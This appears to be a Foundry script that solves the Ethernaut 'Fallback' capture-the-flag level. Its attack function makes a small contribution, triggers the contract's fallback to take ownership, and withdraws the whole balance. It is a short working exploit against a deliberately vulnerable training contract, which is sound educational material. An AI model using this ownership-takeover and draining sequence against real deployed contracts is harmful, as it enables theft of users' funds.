// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Fallback} from "ethernaut/levels/Fallback.sol";
import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";

contract Check is CheckScript("FALLBACK") {}

contract Solve is SolveScript("FALLBACK") {
    Fallback target;

    constructor() {
        target = Fallback(instance);
    }

    function attack() public override {
        // contribute
        target.contribute{value: 1}();

        // fallback
        (bool ok,) = address(target).call{value: 1}("");
        require(ok, "call failed");

        // confirm ownership for the next step
        require(target.owner() == address(player), "must be owner");

        // withdraw
        target.withdraw();

        require(target.owner() == address(player), "owner should be the player");
        require(address(target).balance == 0, "balance should be drained");
    }
}
